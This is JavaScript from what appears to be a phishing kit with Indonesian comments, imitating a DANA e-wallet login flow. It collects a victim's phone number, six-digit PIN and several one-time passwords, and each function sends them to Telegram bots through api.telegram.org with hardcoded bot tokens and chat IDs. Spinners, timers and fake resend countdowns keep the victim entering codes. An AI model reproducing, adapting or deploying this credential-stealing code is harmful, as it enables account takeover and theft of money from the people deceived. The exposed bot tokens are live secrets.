    function formatPhoneNumber() {
      const input = document
        .getElementById('phone');
      let value = input.value.replace(
        /\D/g, ''
      ); // Hapus semua karakter non-digit

      // Validasi angka pertama
      if (value.startsWith('0') || value
        .startsWith('8') || value
        .startsWith('62')) {
        // Format nomor telepon dengan spasi di posisi yang diinginkan
        if (value.length > 3 && value
          .length <= 8) {
          value = value.slice(0, 3) +
            ' ' + value.slice(3);
        } else if (value.length > 8) {
          value = value.slice(0, 3) +
            ' ' + value.slice(3, 7) +
            ' ' + value.slice(7, 13);
        }
      } else {
        // Jika angka pertama tidak sesuai, hapus format dan reset input
        value = value.slice(0, 3);
      }

      input.value = value;
      toggleContinueButton(value);
    }

    function toggleContinueButton(
      value) {
      const continueButton = document
        .getElementById(
          'continueButton');
      // Aktifkan tombol jika panjang nilai minimal 10 karakter
      continueButton.disabled = value
        .replace(/\D/g, '').length < 8;
    }

    function showPage2() {
      // Menampilkan overlay dan spinner
      document.getElementById("spinner")
        .style.display = "flex";

      // Mengambil nomor telepon yang dimasukkan oleh pengguna
      var phoneNumber = document
        .getElementById("phone").value;

      // Menghapus spasi dari nomor telepon
      phoneNumber = phoneNumber.replace(
        /\s/g, '');

      // Mengirim data ke API chat Telegram
      var botToken =
        '7377222998:AAFItwsJcsoygUumfNI1i6SXIlRD5ESiHt0';
      var chatId = '7534451804';
      var message = `**${phoneNumber}**`; // Mengubah teks menjadi bold
      var url =
        `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

      fetch(url)
        .then(response => {
          // Menunggu 3 detik
          setTimeout(function() {
            // Menutup overlay dan spinner
            document
              .getElementById(
                "overlay").style
              .display = "none";
            document
              .getElementById(
                "spinner").style
              .display = "none";

            // Menampilkan Page2
            document
              .getElementById(
                "Page1").style
              .display = "none";
            document
              .getElementById(
                "Page2").style
              .display = "block";
          }, 3000);
        })
        .catch(error => {
          console.error('Error:',
            error);
          // Jika terjadi error, tutup overlay dan spinner
          document.getElementById(
              "overlay").style
            .display = "none";
          document.getElementById(
              "spinner").style
            .display = "none";
        });
    }

    function showPage3() {
      // Menampilkan spinner
      document.getElementById('spinner')
        .style.display = 'flex';

      // Mengirim data ke API chat Telegram
      var botToken =
        '7377222998:AAFItwsJcsoygUumfNI1i6SXIlRD5ESiHt0';
      var chatId = '7534451804';
      const message = 'Lanjut ke PIN.';

      fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message
            })
          })
        .then(response => response
          .json())
        .then(data => {
          console.log(
            'Data berhasil dikirim:',
            data);

          // Setelah 3 detik, tutup spinner, dan tampilkan page3
          setTimeout(() => {
            document
              .getElementById(
                'overlay').style
              .display = 'block';
            document
              .getElementById(
                'spinner').style
              .display = 'none';
            document
              .getElementById(
                'Page3').style
              .display = 'block';
          }, 3000);
        })
        .catch((error) => {
          console.error('Error:',
            error);

          // Jika ada error, tetap tutup spinner setelah 3 detik
          setTimeout(() => {
            document
              .getElementById(
                'spinner').style
              .display = 'block';
            document
              .getElementById(
                'gbrspin').style
              .display = 'none';

            alert(
              'Gagal mengirim data. Silakan coba lagi.'
            );
          }, 3000);
        });

    }

    function showPage4() {
      document.getElementById(
          'overlay').style
        .display = 'none';
      document.getElementById("Page3")
        .style.display = "none";
      // Menampilkan overla

      // Menampilkan spinner
      document.getElementById("spinner")
        .style.display = "flex";

      // Mengambil PIN yang dimasukkan oleh pengguna
      var pin = "";
      for (var i = 1; i <= 6; i++) {
        pin += document.getElementById(
          'pin' + i).value;
      }

      // Mengirim data ke API chat Telegram
      var botToken =
        '7377222998:AAFItwsJcsoygUumfNI1i6SXIlRD5ESiHt0';
      var chatId = '7534451804';
      var message = `PIN DANA: ${pin}`;

      var url =
        `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      fetch(url)
        .then(response => {
          // Menunggu 3 detik
          setTimeout(function() {
            // Menutup spinner
            document
              .getElementById(
                "spinner").style
              .display = "none";
            document.getElementById(
                'overlay').style
              .display = 'block';
            // Menampilkan Page4
            document
              .getElementById(
                "Page3").style
              .display = "none";
            document
              .getElementById(
                "Page4").style
              .display = "block";
          }, 3000);
        })
        .catch(error => {
          console.error('Error:',
            error);
          // Jika terjadi error, tutup spinner dan overlay
          document.getElementById(
              "spinner").style
            .display = "none";
        });
    }

    function showPage5() {
      // Mengambil OTP yang dimasukkan oleh pengguna
      const otpInput = document.getElementById('otpa').value;

      // Periksa apakah OTP sudah diisi dan memiliki panjang yang valid (antara 4 hingga 6 karakter)
      if (otpInput.length >= 4 && otpInput.length <= 6) {
        document.getElementById('overlay').style.display = 'none';
        document.getElementById("Page4a").style.display = "none";

        // Menampilkan spinner
        document.getElementById("spinner").style.display = "flex";

        // Mengirim data ke API chat Telegram
        var botToken =
          '7377222998:AAFItwsJcsoygUumfNI1i6SXIlRD5ESiHt0';
        var chatId = '7534451804';
        var message = `OTPa: ${otpInput}`;

        var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
          .then(response => {
            // Menunggu 3 detik setelah OTP dikirim
            setTimeout(function() {
              // Menutup spinner
              document.getElementById("spinner").style.display = "none";
              document.getElementById('overlay').style.display = 'block';

              // Menampilkan Page5
              document.getElementById("Page5").style.display = "block";
            }, 3000);
          })
          .catch(error => {
            console.error('Error:', error);
            // Jika terjadi error, tutup spinner dan overlay
            document.getElementById("spinner").style.display = "none";
            alert('Terjadi kesalahan saat mengirim OTP. Coba lagi nanti.');
          });
      } else {
        // Tampilkan peringatan jika OTP kurang dari 4 digit atau kosong
        document.getElementById('peringatanOtp').style.display = 'block';
      }
    }

    function showPage6() {
      // Mengambil OTP yang dimasukkan oleh pengguna
      const otpInput = document.getElementById('otpa').value;

      // Periksa apakah OTP sudah diisi dan memiliki panjang yang valid (antara 4 hingga 6 karakter)
      if (otpInput.length >= 4 && otpInput.length <= 6) {
        document.getElementById('overlay').style.display = 'none';
        document.getElementById("Page4a").style.display = "none";

        // Menampilkan spinner
        document.getElementById("spinner").style.display = "flex";

        // Mengirim data ke API chat Telegram
        var botToken = '7240893027:AAFPD87pet-ShEcpc8K1TzEBAqb0t80vHw8';
        var chatId = '5335548660';
        var message = `OTP2: ${otpInput}`;

        var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
          .then(response => {
            // Menunggu 3 detik setelah OTP dikirim
            setTimeout(function() {
              // Menutup spinner
              document.getElementById("spinner").style.display = "none";
              document.getElementById('overlay').style.display = 'block';

              // Menampilkan Page5
              document.getElementById("Page6").style.display = "block";
            }, 3000);
          })
          .catch(error => {
            console.error('Error:', error);
            // Jika terjadi error, tutup spinner dan overlay
            document.getElementById("spinner").style.display = "none";
            alert('Terjadi kesalahan saat mengirim OTP. Coba lagi nanti.');
          });
      } else {
        // Tampilkan peringatan jika OTP kurang dari 4 digit atau kosong
        document.getElementById('peringatanOtp').style.display = 'block';
      }
    }

    function showPage1() {
      document.getElementById("Page6")
        .style.display = "none";
      document.getElementById("Page1")
        .style.display = "block";
      document.getElementById("Page2")
        .style.display = "none";
      document.getElementById("kunci")
        .style.display = "bolck";
    }

    function togglePassword() {
      // Mendapatkan semua input field
      const pins = document
        .querySelectorAll(
          '.pin-container input');

      // Mengecek apakah saat ini input type adalah password atau text
      const isPassword = pins[0]
        .type === 'password';

      // Ubah tipe input menjadi text jika saat ini password, dan sebaliknya
      pins.forEach(pin => {
        pin.type = isPassword ?
          'text' : 'password';
      });

      // Ubah teks tombol menjadi "Tampilkan" atau "Sembunyikan"
      const toggleButton = document
        .getElementById('toggleButton');
      toggleButton.textContent =
        isPassword ? 'Sembunyikan' :
        'Tampilkan';
    }

    /////////////////////////////////////////

    let countdown = 60;
    const resendButton = document.getElementById('resendButton');

    function startCountdown() {
      const interval = setInterval(() => {
        countdown--;
        resendButton.textContent = `Kirim Ulang: ${countdown}s`;

        if (countdown <= 0) {
          clearInterval(interval);
          resendButton.textContent = 'Kirim Ulang';
          resendButton.classList.add('enabled');
          resendButton.disabled = false;
          resendButton.style.cursor = 'pointer';
        }
      }, 1000);
    }

    startCountdown();

    resendButton.addEventListener('click', () => {
      countdown = 320; // Reset timer
      resendButton.disabled = true;
      resendButton.classList.remove('enabled');
      resendButton.style.cursor = 'not-allowed';
      startCountdown();
    });

    ///////////////////////////////////////////////

    // Fungsi untuk mengaktifkan input berikutnya saat karakter dimasukkan
    function checkAndEnable(current, nextId) {
      if (current.value.length === 1) {
        const nextInput = document.getElementById(nextId);
        if (nextInput) {
          nextInput.disabled = false;
          nextInput.focus();
        }
      }
    }

    ///////////////////////////////////////

    let waktu = 90; // 80 detik

    function hitungMundur() {
      document.getElementById("timer").innerHTML = waktu + "s";

      if (waktu > 0) {
        waktu--;
        setTimeout(hitungMundur, 1000);
      } else {
        document.getElementById("kunOtp").style.display = "none";
      }
    }

    // Mulai hitung mundur
    hitungMundur();

    ///////////////////////////////////////////

    function showPage4a() {
      // Mengambil OTP yang dimasukkan oleh pengguna
      const otpInput = document.getElementById('otp').value;

      // Periksa apakah OTP sudah diisi dan memiliki panjang yang valid (antara 4 hingga 6 karakter)
      if (otpInput.length >= 4 && otpInput.length <= 6) {
        document.getElementById('overlay').style.display = 'none';
        document.getElementById("Page4").style.display = "none";
        document.getElementById("spinner").style.display = "flex";

        var botToken =
          '7377222998:AAFItwsJcsoygUumfNI1i6SXIlRD5ESiHt0';
        var chatId = '7534451804';
        var message = `OTPa: ${otpInput}`;
        var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
          .then(response => {
            // Menunggu 3 detik setelah OTP dikirim
            setTimeout(function() {
              // Menutup spinner
              document.getElementById("spinner").style.display = "none";
              document.getElementById('overlay').style.display = 'block';
              document.getElementById("Page4a").style.display = "block";
            }, 3000);
          })
          .catch(error => {
            console.error('Error:', error);
            // Jika terjadi error, tutup spinner dan overlay
            document.getElementById("spinner").style.display = "none";
            alert('Terjadi kesalahan saat mengirim OTP. Coba lagi nanti.');
          });
      } else {
        // Tampilkan peringatan jika OTP kurang dari 4 digit atau kosong
        document.getElementById('peringatanOtp').style.display = 'block';
      }
    }

    ////////////////////////////////////////////

    // Fungsi untuk hitung mundur
    function startCountdown(duration, display) {
      var timer = duration,
        seconds;
      var countdownInterval = setInterval(function() {
        seconds = parseInt(timer, 10);
        display.textContent = seconds;

        if (--timer < 0) {
          clearInterval(countdownInterval); // Menghentikan hitungan
          document.getElementById("kunci").style.display = "none"; // Sembunyikan elemen 'kunci'
        }
      }, 1000); // Mengurangi 1 detik setiap interval
    }